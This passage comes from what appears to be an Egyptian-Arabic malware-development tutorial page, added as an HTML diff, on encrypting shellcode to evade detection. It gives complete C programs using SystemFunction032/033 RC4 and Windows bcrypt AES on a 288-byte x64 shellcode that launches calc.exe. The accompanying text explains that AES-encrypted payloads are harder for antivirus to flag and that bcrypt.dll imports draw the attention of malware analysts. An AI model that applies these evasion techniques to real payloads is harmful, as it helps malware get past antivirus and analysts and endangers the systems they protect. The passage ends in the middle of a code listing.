+                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;printf("[i] OurShellCode Encrypted Address: 0x%p\n", OurShellCode);<br>
+                            &nbsp;&nbsp;printf("[i] Encrypted OurShellCode: ");<br>
+                            &nbsp;&nbsp;for (size_t i = 0; i < shellcode_len; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", OurShellCode[i]);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;printf("\n\n");<br><br>
+                    
+                                &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Decrypt .....\n");<br>
+                                &nbsp;&nbsp;getchar();<br><br>
+                    
+                                &nbsp;&nbsp;if (!Rc4EncryptionViaSystemFunc032(keys, OurShellCode, sizeof(keys), shellcode_len)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                    
+                                    &nbsp;&nbsp;printf("[i] Decrypted OurShellCode: ");<br>
+                                    &nbsp;&nbsp;for (size_t i = 0; i < shellcode_len; i++) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\\x%02x", OurShellCode[i]);<br>
+                                        &nbsp;&nbsp;}<br>
+                                        &nbsp;&nbsp;printf("\n");<br><br>
+                    
+                                        &nbsp;&nbsp;if (memcmp(OriginalShellCode, OurShellCode, shellcode_len) == 0) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Decryption Successful!\n");<br>
+                                            &nbsp;&nbsp;}<br>
+                                            &nbsp;&nbsp;else {<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Decryption Failed: Data Mismatch\n");<br>
+                                                &nbsp;&nbsp;}<br><br>
+                                                &nbsp;&nbsp;getchar();<br><br>
+                                                &nbsp;&nbsp;return 0;<br>
+                    }<br>
+            </code></div>
+                <br>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.3 RC4 Encryption Via SystemFunction033 :</h3>
+                <p>[+] فـ الجزء اللـ فات استخدمنا SystemFunction032 ، الويندوز بيوفر كمان <code
+                        style="background: #16ff00; font-size: 14px;">SystemFunction033</code> ، ودي نسخة
+                    تانية بس بتتعامل مع الداتا بطريقة مختلفة شوية .. الفرق الأساسي إن SystemFunction033 بتتعامل مع
+                    <code style="background: #16ff00; font-size: 14px;">UNICODE_STRING</code> بدل USTRING ، وده بيخليها
+                    تكون متوافقة أكتر مع بعض السيناريوهات اللـ بتحتاج Unicode
+                    Data
+                    Processing.
+                </p>
+                <p>كل اللـ هنعمله إن هناخد الكود اللـ فات كوبي .. وهنـ Replace أي 032 بـ 033 بس ، وهو هو نفس الكود بنفس
+                    كل حاجه.</p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/RC4-18.png" alt="RC4-18" class="article-image" loading="lazy">
+                </div>
+                <p>[+] وهتلاقي نفس النتيجة لما تـ رن.</p>
+                <H2 style="direction: ltr;">3. AES Encryption :</H2>
+                <p>[+] فـ الأجزاء اللـ فاتت اتكلمنا عن RC4 Encryption، وشفنا 3 طُرق لتشفير الشيل كود بتاعنا .. بس فـ
+                    مشكلة ، وهي إن الـ RC4 خوارزمية تشفير <code
+                        style="background: #16ff00; font-size: 14px;">Stream Cipher</code> ، وده معناه إنها بتشتغل ع
+                    <code style="background: #16ff00; font-size: 14px;">Byte-by-Byte</code> ، وده
+                    بيخليها عُرضة لهجمات معينة زي Bit-Flipping Attacks .. عشان كده المرادي هنروح لحاجة أقوى وهي AES
+                    Encryption.
+                </p>
+                <p style="font-weight: bold;">[+] طيب ليه نستخدم AES بدل RC4؟</p>
+                <ol>
+                    <li>أمان أعلى لإن الـ AES بيستخدم <code
+                            style="background: #16ff00; font-size: 14px;">Block Cipher</code> بدل Stream Cipher ، وده
+                        بيخليه أقوى بكتير ضد محاولات
+                        فك التشفير العشوائية.</li>
+                    <li>بيكون مُعقد أكتر لإن برامج الحماية بقت بتعرف تكتشف الـ RC4 Encrypted Payloads بسهولة ، لكن AES
+                        بيصعب عليهم القصة.</li>
+                    <li>وكمان مُعتمد بشكل رسمي لإن معظم الأنظمة الحديثة بتستخدم AES.</li>
+                </ol>
+                <p style="font-weight: bold;">[+] إيه هو بقي الـ AES ؟</p>
+                <p>الـ AES أو الـ Advanced Encryption Standard ، دا نوع من أنواع ألجوريزم التشفير بيشتغل بطريقة الـ
+                    <code style="background: #16ff00; font-size: 14px;">Symmetric Key Encryption</code> ، يعني نفس الكي
+                    بيستخدم فـ التشفير والفك .. ودي خوارزمية قوية وبتستخدم فـ
+                    تأمين البيانات والمعلومات الحساسة لإنها بتوصل خصوصية عالية.
+                </p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-1.png" alt="AES-1" class="article-image" loading="lazy">
+                </div>
+                <p style="font-weight: bold;">[+] بيشتغل إزاي؟</p>
+                <p>الـ AES ع عكس الـ RC4 مش بيشفر الداتا Byte-by-Byte ، لا هو بيشتغل ع شكل بلوكات (Blocks) ، يعني بيقسم
+                    الداتا لمجموعة أجزاء كل جزء حجمه 16 بايت (128 بت) .. بيحصل التشفير ع كل بلوك لوحده ، والعمليات بتتم
+                    ع كذا جولة (Round) ع حسب طول الكي:</p>
+                <ul style="font-weight: bold;">
+                    <li>AES-128: فيه 10 جولات</li>
+                    <li>AES-192: فيه 12 جولة</li>
+                    <li>AES-256: فيه 14 جولة</li>
+                </ul>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-1-2.png" alt="AES-1" class="article-image" loading="lazy">
+                </div>
+                <p>كل جولة فيها 4 عمليات أساسية بتحول الداتا لحالة مش مفهومة خالص:</p>
+                <ol>
+                    <li style="font-weight: bold;">SubBytes (استبدال البايتات)</li>
+                    <p>فـ الخطوة دي بتاخد كل بايت فـ البلوك وتستبدله بـ بايت تاني باستخدام جدول معين اسمه S-Box ،
+                        والجدول ده معمول بطريقة تخلي أي تغيير فـ البايت الواحد يغير النتيجة كلها.</p>
+                    <li style="font-weight: bold;">ShiftRows (تحريك الصفوف)</li>
+                    <p>هنا البيانات بتتخزن ع شكل مصفوفة 4×4 ، والخطوة دي بتحرك الصفوف بتاعتها كالتالي:<br>
+                    <ul style="font-weight: bold;">
+                        <li>الصف الأول بيفضل زي ما هو</li>
+                        <li>الصف التاني يتحرك خطوة واحدة</li>
+                        <li>الصف التالت يتحرك خطوتين</li>
+                        <li>الصف الرابع يتحرك 3 خطوات</li>
+                    </ul>
+                    ده بيعمل خلط للبيانات ويقلل احتمالية فك التشفير بسهولة.
+                    </p>
+                    <li style="font-weight: bold;">MixColumns (خلط الأعمدة)</li>
+                    <p>هنا كل عمود فـ المصفوفة بيتحول باستخدام معادلات رياضية معقدة ، وده بيزود صعوبة الكسر ويخلط البتات
+                        أكتر.</p>
+                    <li style="font-weight: bold;">AddRoundKey (إضافة الكي)</li>
+                    <p>آخر خطوة هي دمج الداتا مع الكي باستخدام عملية XOR.</p>
+                </ol>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-1-3.png" alt="AES-1-3" class="article-image" loading="lazy">
+                </div>
+                <p>[+] وكل الخطوات دي بتحصل عشان تتم عملية الـ Encryption ، وعشان يحصل الـ Decryption بتتعكس الخطوات
+                    كالتالي:</p>
+                <ol style="font-weight: bold;">
+                    <li>AddRoundKey (نفس الكي بس بالعكس)</li>
+                    <li>Inverse MixColumns</li>
+                    <li>Inverse ShiftRows</li>
+                    <li>Inverse SubBytes</li>
+                </ol>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-2.jpg" alt="AES-2" class="article-image" loading="lazy">
+                </div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">3.1 AES Encryption Via Bcrypt.lib :</h3>
+                <p>[+] الفكرة هنا إن الويندوز بيوفر مكتبة اسمها <code
+                        style="background: #16ff00; font-size: 14px;">Bcrypt.lib</code> ، ودي مكتبة بتسهل تنفيذ
+                    خوارزميات التشفير زي
+                    AES من غير مـ تكتب الكود بنفسك .. وهنستخدم Windows Crypto API لتشفير وفك الـ Shellcode بتاعنا.</p>
+                <p> يلا نشوف أجزاء من الكود :</p>
+                <ol>
+                    <li>دي مكتبة التشفير بتاعة الويندوز اللـ هنستخدمها.</li>
+                    <li>فـ السطر ده بعرف الـ Compiler إنه يربط الأكواد بتاعة مكتبة الـ bcrypt.lib عشان نقدر نشتخدم
+                        الدوال بتاعة التشفير اللـ جواها.</li>
+                    <li> هنا إحنا بنحدد إن حجم البلوك بتاع التشفير 16 بايت، وده لأن خوارزمية AES بتشتغل ببلوكات حجمها 16
+                        بايت.</li>
+                    <li>دا الشيل كود اللـ بنستخدمة كل مره ، والكي طوله 16 بايت ، وده طبيعي لأن AES-128 بيستخدم مفتاح
+                        بنفس الطول ده.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-3.png" alt="AES-3" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنا جزء الفانكشن <code style="background: #16ff00; font-size: 14px;">AESEncryptDecrypt</code> ،
+                        ودي وظيفتها تشفر أو تفك تشفير الداتا باستخدام <code
+                            style="background: #16ff00; font-size: 14px;">AES-128</code> فـ
+                        وضع الـ CBC ع حسب قيمة encrypt .. الأول بتفتح مزود التشفير <code
+                            style="background: #16ff00; font-size: 14px;">(BCryptOpenAlgorithmProvider)</code> ، وتحدد
+                        إننا هنشتغل بـ وضع CBC ، بعد كدا بتجيب حجم الكي المطلوب <code
+                            style="background: #16ff00; font-size: 14px;">(BCryptGetProperty)</code> ، وتعمل كي التشفير
+                        <code style="background: #16ff00; font-size: 14px;">(BCryptGenerateSymmetricKey)</code> باستخدام
+                        AESKey بعد مـ المفتاح يكون جاهز ، لو <code
+                            style="background: #16ff00; font-size: 14px;">encrypt == TRUE</code>
+                        الفانكشن بتشفر الداتا <code style="background: #16ff00; font-size: 14px;">(BCryptEncrypt)</code>
+                        ، ولو FALSE بتعمل فك تشفير <code
+                            style="background: #16ff00; font-size: 14px;">(BCryptDecrypt)</code> ، وبعد مـ
+                        العملية تخلص بتنسخ النتيجة مكان الداتا الأصلية وترجع TRUE لو كل حاجة مشت تمام ، أو FALSE لو حصلت
+                        مشكلة ، وفـ الحالتين بتنضف الميموري قبل مـ تخرج.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-4.png" alt="AES-4" class="article-image" loading="lazy">
+                    </div>
+                    <li>آخر جزء وهو الـ main ، وهنا بقي الأول بيحسب حجم الـ <code
+                            style="background: #16ff00; font-size: 14px;">Shellcode (originalSize)</code> ، وبيحفظه فـ
+                        processedSize ، وبعدين بتشتغل دالة التشفير AESEncryptDecrypt ع OurShellCode ، ولو العملية نجحت،
+                        بيطبع الـ Shellcode المتشفر .. بعد كدا عملية فك التشفير بنفس الدالة ، ولو نجحت بيطبع الـ
+                        Shellcode بعد الفك. </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-5.png" alt="AES-5" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ol style="font-weight: bold;">
+                    <li>ودا كدا الشيل كود قبل أي حاجه :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-6.png" alt="AES-6" class="article-image" loading="lazy">
+                    </div>
+                    <li>ودا الشيل كود بعد التشفير :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-7.png" alt="AES-7" class="article-image" loading="lazy">
+                    </div>
+                    <li>وتمت عملية الفك بنجاح :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-8.png" alt="AES-8" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت أول طريقة فـ الـ AES .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                        #include &lt;windows.h&gt;<br>
+                        #include &lt;bcrypt.h&gt;<br>
+                        #include &lt;stdio.h&gt;<br><br>
+                        
+                        #pragma comment(lib, "bcrypt.lib")<br><br>
+                        
+                        #define AES_BLOCK_SIZE 16<br><br>
+                        
+                        unsigned char OurShellCode[288] =<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                        
+                        unsigned char AESKey[16] = { 0x04, 0x0d, 0x0e, 0x01, 0x04, 0x0d, 0x0e, 0x01,
+                                                     0x04, 0x0d, 0x0e, 0x01, 0x04, 0x0d, 0x0e, 0x01 };<br><br>
+                        
+                        BOOL AESEncryptDecrypt(PBYTE pData, DWORD dataSize, DWORD* pResultSize, BOOL encrypt) {<br>
+                            &nbsp;&nbsp;BCRYPT_ALG_HANDLE hAlgorithm = NULL;<br>
+                            &nbsp;&nbsp;BCRYPT_KEY_HANDLE hKey = NULL;<br>
+                            &nbsp;&nbsp;DWORD cbKeyObject = 0, cbData = 0, cbResult = 0, cbCipherText = 0;<br>
+                            &nbsp;&nbsp;PBYTE pbKeyObject = NULL;<br>
+                            &nbsp;&nbsp;PBYTE pbOutput = NULL;<br>
+                            &nbsp;&nbsp;unsigned char IV[AES_BLOCK_SIZE] = { 0 };<br><br>
+                        
+                        
+                            &nbsp;&nbsp;if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {<br>
+                                &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Failed to open algorithm provider. Error Code: 0x%X\n", GetLastError());<br>
+                                &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) {<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Failed to set chaining mode. Error Code: 0x%X\n", GetLastError());<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;if (BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) {<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Failed to get key object length. Error Code: 0x%X\n", GetLastError());<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                                        &nbsp;&nbsp;pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);<br>
+                                        &nbsp;&nbsp;if (!pbKeyObject) {<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Memory allocation failed for key object\n");<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                        
+                        
+                                            &nbsp;&nbsp;if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, pbKeyObject, cbKeyObject, AESKey, sizeof(AESKey), 0) != 0) {<br>
+                                                &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Failed to generate key. Error Code: 0x%X\n", GetLastError());<br>
+                                                &nbsp;&nbsp; &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbKeyObject);<br>
+                                                &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                                &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                                &nbsp;&nbsp;}<br><br>
+                        
+                        
+                                                &nbsp;&nbsp;NTSTATUS status;<br>
+                                                &nbsp;&nbsp;if (encrypt) {<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;status = BCryptEncrypt(hKey, pData, dataSize, NULL, IV, sizeof(IV), NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;else {<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;status = BCryptDecrypt(hKey, pData, dataSize, NULL, IV, sizeof(IV), NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (status != 0) {<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Failed to get size. Error Code: 0x%X\n", status);<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;BCryptDestroyKey(hKey);<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbKeyObject);<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);<br>
+                                    &nbsp;&nbsp;if (!pbOutput) {<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] Memory allocation failed\n");<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;BCryptDestroyKey(hKey);<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbKeyObject);<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                                        &nbsp;&nbsp;unsigned char localIV[AES_BLOCK_SIZE] = { 0 };<br>
+                                        &nbsp;&nbsp;if (encrypt) {<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;status = BCryptEncrypt(hKey, pData, dataSize, NULL, localIV, sizeof(localIV), pbOutput, cbCipherText, &cbData, BCRYPT_BLOCK_PADDING);<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;}<br>
+                                            &nbsp;&nbsp;else {<br>
+                                                &nbsp;&nbsp; &nbsp;&nbsp;status = BCryptDecrypt(hKey, pData, dataSize, NULL, localIV, sizeof(localIV), pbOutput, cbCipherText, &cbData, BCRYPT_BLOCK_PADDING);<br>
+                                                &nbsp;&nbsp;}<br><br>
+                        
+                                                &nbsp;&nbsp;if (status != 0) {<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;printf("[-] %s failed. Error Code: 0x%X\n", encrypt ? "Encryption" : "Decryption", status);<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbOutput);<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;BCryptDestroyKey(hKey);<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbKeyObject);<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                                    &nbsp;&nbsp; &nbsp;&nbsp;return FALSE;<br>
+                                                    &nbsp;&nbsp;}<br><br>
+                        
+                                                    &nbsp;&nbsp;memcpy(pData, pbOutput, cbData);<br>
+                                                    &nbsp;&nbsp;*pResultSize = cbData;<br><br>
+                        
+                                                    &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbOutput);<br>
+                                                    &nbsp;&nbsp;BCryptDestroyKey(hKey);<br>
+                                                    &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pbKeyObject);<br>
+                                                    &nbsp;&nbsp;BCryptCloseAlgorithmProvider(hAlgorithm, 0);<br>
+                                                    &nbsp;&nbsp;return TRUE;<br>
+                        }<br><br>
+                        
+                        int main() {<br>
+                            &nbsp;&nbsp;DWORD originalSize = sizeof(OurShellCode) - 1; <br><br>
+                        
+                            &nbsp;&nbsp;DWORD processedSize = originalSize;<br><br>
+                        
+                            &nbsp;&nbsp;printf("[i] Original Address: 0x%p\n", OurShellCode);<br>
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter&gt; to Encrypt ... \n");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                        
+                            &nbsp;&nbsp;printf("[+] Encrypting...\n");<br>
+                            &nbsp;&nbsp;if (!AESEncryptDecrypt(OurShellCode, originalSize, &processedSize, TRUE)) {<br>
+                                &nbsp;&nbsp; &nbsp;&nbsp;return -1;<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;printf("[i] Encrypted Shellcode (%d bytes):\n", processedSize);<br>
+                                &nbsp;&nbsp;for (DWORD i = 0; i < processedSize; i++) {<br>
+                                    &nbsp;&nbsp; &nbsp;&nbsp; printf("\\x%02x", OurShellCode[i]);<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;printf("\n\n");<br>
+                                    &nbsp;&nbsp;printf("Press &lt;Enter&gt; to Decrypt ... \n");<br><br>
+                        
+                                    &nbsp;&nbsp;getchar();<br><br>
+                        
+                                    &nbsp;&nbsp;printf("[+] Decrypting...\n");<br>
+                                    &nbsp;&nbsp;if (!AESEncryptDecrypt(OurShellCode, processedSize, &processedSize, FALSE)) {<br>
+                                        &nbsp;&nbsp; &nbsp;&nbsp;return -1;<br>
+                                        &nbsp;&nbsp;}<br>
+                                        &nbsp;&nbsp;printf("[i] Decrypted Shellcode (%d bytes):\n", processedSize);<br>
+                                        &nbsp;&nbsp;for (DWORD i = 0; i < processedSize; i++) {<br>
+                                            &nbsp;&nbsp; &nbsp;&nbsp;printf("\\x%02x", OurShellCode[i]);<br>
+                                            &nbsp;&nbsp;}<br>
+                                            &nbsp;&nbsp;printf("\n");<br>
+                                            &nbsp;&nbsp;getchar();<br><br>
+                        
+                                            &nbsp;&nbsp;return 0;<br>
+                        }<br>
+
+                </code></div>
+                <br>
+                <p style="font-weight: bold;">[+] بس فـ حاجه .. الطريقة دي فيها مشكلة ، إيه هي المشكلة دي بقي ؟</p>
+                <p>لما تحط البرنامج ع PE-Bear أو Total PE، هتلاقي فـ جزء الـ Import Table إن مكتبة <code
+                        style="background: #16ff00; font-size: 14px;">bcrypt.dll</code> موجودة ،
+                    وده بيدي علامة واضحة إن البرنامج بيستخدم دوال التشفير ، سواء للتشفير أو الفك .. وده مشكلة لسببين:
+                </p>
+                <ol>
+                    <li style="font-weight: bold;">برامج الـ Antivirus ممكن تشك فيه بسهولة :</li>
+                    <p>أي برنامج بيستخدم <code style="background: #16ff00; font-size: 14px;">bcrypt.dll</code> فـ بيئة
+                        غير تقليدية (زي إنه بيتعامل مع Shellcode) ، هيكون مشبوه
+                        بالنسبة للـ AV ، وده ممكن يخليه يتقفش ويتصنف كـ Malware أو Suspicious Program.</p>
+                    <li style="font-weight: bold;">الناس الجميلة بتوع الـ <code
+                            style="background: #16ff00; font-size: 14px;">Malware Analysts</code> ممكن يكتشفوه بسرعة:
+                    </li>
+                    <p>لما حد منهم يحلل الملف ، هيلاحظ إن البرنامج بيتعامل مع <code
+                            style="background: #16ff00; font-size: 14px;">bcrypt.dll</code> ، وده معناه إنه ممكن يكون
+                        بيشفر
+                        حاجة عشان يخفيها .. فبالتالي هيحاول يفك التشفير ويحلل الـ Shellcode عشان يفهم بيعمل إيه.</p>
+                </ol>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/AES-9.png" alt="AES-9" class="article-image" loading="lazy">
+                </div>
+                <p style="font-weight: bold;">[+] هنحل الموضوع ده بالطريقة التانيه.</p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">3.2 AES Encryption Via Imported Files :</h3>
+                <p>[+] فـ الطريقة دي بقي .. هنعالج المشكلة بتاعة الطريقة اللـ فاتت .. وأنا سميت الطريقة دي Imported
+                    Files ، لإننا هنعتمد ع ملفات نضيفها فـ البروجيكت بتاعنا .. مش هنعتمد ع مكتبة الويندوز.</p>
+                <ul>
+                    <li>الأول هنجتاج نـ Import ملفين وهما <code
+                            style="background: #16ff00; font-size: 14px;">aes.c ، aes.h</code> .. ولو مش عارف بنضيفهم
+                        إزاي إرجع لمقالة الـ
+                        Payload Placement وتحديدا جزء الـ Rsrc وهتعرف.</li>
+                    <p>ودا <a href="https://github.com/kokke/tiny-AES-c" target="_blank" class="download-link">لينك
+                            المصدر</a> للملفين ع الجيتهاب.</p>
+                    <p>ودا <a
+                            href="https://medium.com/@satvikhatulkar/payload-encryption-methods-and-mitigation-malware-development-part-2-60a437567d5e"
+                            target="_blank" class="download-link">لينك المصدر</a> للكود.</p>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-10.png" alt="AES-10" class="article-image" loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] تعالي نـ رن :</p>
+                <ol style="font-weight: bold;">
+                    <li>دا كدا العنوان للشيل كود الأصلي بتاعنا.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-11.png" alt="AES-11" class="article-image" loading="lazy">
+                    </div>
+                    <li>وهنا عمل الـ Encryption ، وطبع الـ Key ، والـ IV.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-12.png" alt="AES-12" class="article-image" loading="lazy">
+                    </div>
+                    <li>هناخد الـ Output اللـ طلع كوبي .. وهنعمل كومنت ع فانكشن الـ Encryption .. ونشيل الكومنت من ع
+                        فانكشن الـ Decryption .. ونضيف الـ Output ، ونـ رن.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-13.png" alt="AES-13" class="article-image" loading="lazy">
+                    </div>
+                    <li>وهنا هنلاقي الشيل كود المتشفر بتاعنا :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-14.png" alt="AES-14" class="article-image" loading="lazy">
+                    </div>
+                    <li>وكدا تم الفك بنجاح ورجع لأصلة :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/AES-15.png" alt="AES-15" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] ودي كانت تاني وآخر طريقة فـ الـ AES .. ودا الكود النهائي:</p>
+                <div class="code-block"><code>
+                    #include &lt;windows.h&gt;<br>
+                    #include &lt;aes.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
